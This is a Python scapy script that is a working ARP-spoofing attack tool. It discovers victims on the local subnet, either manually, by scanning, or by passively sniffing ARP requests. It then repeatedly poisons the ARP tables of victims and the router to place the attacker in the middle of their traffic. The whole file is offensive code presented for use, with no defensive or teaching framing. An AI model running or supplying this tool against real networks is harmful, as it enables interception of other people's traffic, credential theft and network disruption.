
#!/usr/bin/env python
import time
import sys
import scapy.all as scapy
#from scapy.all import *
import os
import time
import threading

arp_looping = False #set this to false to stop the thread

# MAC address function which will return
# the mac_address of the provided ip address 
def get_mac(ip):
    if ip == ATTACKER_IP :
        return ATTACKER_MAC
    # creating an ARP request to the ip address
    arp_request = scapy.ARP(pdst=ip)
    # setting the denstination MAC address to broadcast MAC
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # combining the ARP packet with the broadcast message
    arp_request_broadcast = broadcast / arp_request
     
    # return a list of MAC addresses with respective
    # MAC addresses and IP addresses.
    answ = scapy.srp(arp_request_broadcast, timeout=0.1, verbose=False, iface=IFACE)[0]
    if answ:
        # we choose the first MAC address and select
        # the MAC address using the field hwsrc
        return answ[0][1].hwsrc
    else:
        print("No ARP response for {}".format(ip))
        sys.exit(0)

 
  
def arp_spoof(target_ip, spoof_ip):
    """"Create and send ARP packet"""
    arp = scapy.ARP(op=2, pdst=target_ip,
                       hwdst=get_mac(target_ip), psrc=spoof_ip)
    ether = scapy.Ether(src=ATTACKER_MAC)
    packet = ether/arp
    scapy.sendp(packet, verbose=False, iface=IFACE)

def restore(victim_ip, source_ip):
    """"Restore arp table of victim"""
    victim_mac = get_mac(victim_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=victim_mac,
                       psrc=source_ip, hwsrc=source_mac)
    scapy.sendp(packet, count=4, verbose=False, iface=IFACE)
 

def arp_prep(manual, router, input_iface):
    global victim_addresses, router_ip, IFACE, ATTACKER_IP, ATTACKER_MAC
    
    if manual is None:
        print("No victim addresses given, quitting...")
        sys.exit()
    if router is None:
        print("No router address given, quitting...")
        sys.exit()
    
    IFACE = input_iface
    ATTACKER_IP = scapy.get_if_addr(IFACE)
    ATTACKER_MAC = scapy.get_if_hwaddr(IFACE)
    print(ATTACKER_IP, ATTACKER_MAC)

    for ip in manual :
        victim_addresses[ip] = get_mac(ip)
    router_ip = router

    return


#Automated code
victim_addresses = {}
router_ip = None
current_ip = None
iface = None

def arp_prep_automated(router_ip_, iface_ = "enp0s10") :
    global victim_addresses, router_ip, iface, current_ip
    global IFACE, ATTACKER_MAC

    IFACE = iface_

    current_ip = scapy.get_if_addr(iface_)
    ATTACKER_MAC = scapy.get_if_hwaddr(iface_)
    
    subnet = current_ip.rsplit('.', 1)[0] #split rightmost number off

    if not router_ip_:
        router_ip = subnet + '.1'
    else:
        router_ip = router_ip_

    for i in range(1,10) :  # ips in subnet, should be (1, 255)
        ip = subnet + "." + str(i)
        try :
            victim_addresses[ip] = get_mac(ip) #exists
        except :
            pass #does not exist

    if current_ip in victim_addresses:
        del victim_addresses[current_ip]
    
    
    print("Victims: ", str(victim_addresses))

arp_scouting_thread = None
arp_scouting = True
def arp_prep_silent(input_iface, router_ip_):
    global IFACE, ATTACKER_IP, ATTACKER_MAC, arp_scouting_thread, router_ip
    IFACE = input_iface
    ATTACKER_IP = scapy.get_if_addr(IFACE)
    ATTACKER_MAC = scapy.get_if_hwaddr(IFACE)

    if not router_ip_:
        subnet = ATTACKER_IP.rsplit('.', 1)[0] #split rightmost number off
        router_ip = subnet + '.1' #usually router is at subnet .1
    else:
        router_ip = router_ip_

    arp_scouting_thread = threading.Thread(target=arp_silent)
    arp_scouting_thread.daemon = True
    arp_scouting_thread.start()
    return

def arp_silent():
    while arp_scouting:
        scapy.sniff(prn=arp_scout_callback, store=0, iface=IFACE)

#When an arp request or answer is detected, spoof the arp table, also answer to override it.
def arp_scout_callback(packet):
    print("debug")
    if packet[scapy.Ether].src == ATTACKER_MAC:
        return
    if packet.haslayer(scapy.ARP):
        
        requestor_ip = None
        if packet[scapy.ARP].op == 1:
            requestor_ip = packet[scapy.ARP].psrc
        else :
            requestor_ip = packet[scapy.ARP].pdst

        arp_spoof(requestor_ip, router_ip)
        arp_spoof(router_ip, requestor_ip)
    
    return

    

def arp_tick():
    for victim_ip, victim_mac in victim_addresses.items():
            arp_spoof(victim_ip, router_ip) #send to victim that we are router
            arp_spoof(router_ip, victim_ip) #send to router that we are victim

arp_thread = None
def arp_run():
    #run arp_thread on a thread
    global arp_thread, arp_looping
    arp_looping = True
    arp_thread = threading.Thread(target=arp_loop)
    arp_thread.daemon = True
    arp_thread.start()

def arp_loop():
    while arp_looping:
        arp_tick()
        time.sleep(5)
